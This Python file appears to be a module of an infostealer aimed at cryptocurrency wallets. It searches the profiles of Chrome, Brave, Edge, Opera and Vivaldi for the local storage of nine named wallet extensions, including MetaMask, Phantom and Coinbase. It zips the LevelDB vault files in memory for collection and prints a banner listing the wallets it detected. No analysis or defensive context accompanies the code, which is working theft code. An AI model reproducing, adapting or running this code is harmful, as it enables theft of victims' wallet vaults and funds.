import os
import shutil
import zipfile
import io

def grab_wallet_extensions():
    local = os.getenv('LOCALAPPDATA')
    
    extension_targets = {
        "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
        "Phantom": "bfnaoomeoheidokpghpifbboncluebei",
        "BinanceChain": "fhbohgcigdclontbkpcfhkicamebeadh",
        "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnoel",
        "TrustWallet": "egjidleclnjpkianhfhelpcleocghclm",
        "Argent": "ohmabeoihghmbaneenbiihbetmboackb",
        "Kaikas": "jblndlipeogpafnldhgmapagcccfchco",
        "BitKeep": "jiidiaalihjhindicjgnbdnnddbhdjnl",
        "Solflare": "bhhhlbpeboebidndecjhdocciaebndme"
    }
    
    # Potential browser extension locations
    browsers = {
        "Chrome": os.path.join(local, "Google", "Chrome", "User Data"),
        "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data"),
        "Edge": os.path.join(local, "Microsoft", "Edge", "User Data"),
        "Opera": os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera GX Stable"),
        "Vivaldi": os.path.join(local, "Vivaldi", "User Data")
    }
    
    wallet_files = []
    
    for b_name, b_path in browsers.items():
        if not os.path.exists(b_path): continue
        
        for folder in os.listdir(b_path):
            profile_path = os.path.join(b_path, folder)
            if not os.path.isdir(profile_path): continue
            
            ext_path = os.path.join(profile_path, "Local Extension Settings")
            if not os.path.exists(ext_path): continue
            
            for w_name, w_id in extension_targets.items():
                target_ext_dir = os.path.join(ext_path, w_id)
                if os.path.exists(target_ext_dir):
                    # Found a wallet! Grab LevelDB files
                    for root, dirs, files in os.walk(target_ext_dir):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arcname = os.path.join("Wallets", b_name, folder, w_name, os.path.relpath(file_path, target_ext_dir))
                            wallet_files.append((arcname, file_path))

    if not wallet_files: return None
    
    try:
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for arcname, full_path in wallet_files:
                try:
                    if os.path.getsize(full_path) < 10 * 1024 * 1024: # Cap at 10MB per file
                        zipf.write(full_path, arcname=arcname)
                except: pass
        zip_buffer.seek(0)
        return zip_buffer.getvalue()
    except: return None

def get_wallet_ext_report():
    # Simple list of what was found
    found = set()
    local = os.getenv('LOCALAPPDATA')
    extension_targets = {
        "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn", "Phantom": "bfnaoomeoheidokpghpifbboncluebei",
        "Binance": "fhbohgcigdclontbkpcfhkicamebeadh", "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnoel"
    }
    browsers = {
        "Chrome": os.path.join(local, "Google", "Chrome", "User Data"),
        "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data")
    }
    
    for b_path in browsers.values():
        if not os.path.exists(b_path): continue
        for folder in os.listdir(b_path):
            p = os.path.join(b_path, folder, "Local Extension Settings")
            if os.path.exists(p):
                for w_name, w_id in extension_targets.items():
                    if os.path.exists(os.path.join(p, w_id)): found.add(w_name)
                    
    if not found: return "No wallet extensions found."
    
    report = "╔════════════════════════════════════════╗\n"
    report += "║        CRYPTO WALLET EXTENSIONS        ║\n"
    report += "╠════════════════════════════════════════╣\n"
    for w in found: report += f"║ DETECTED: {w.ljust(28)} ║\n"
    report += "╚════════════════════════════════════════╝"
    return report
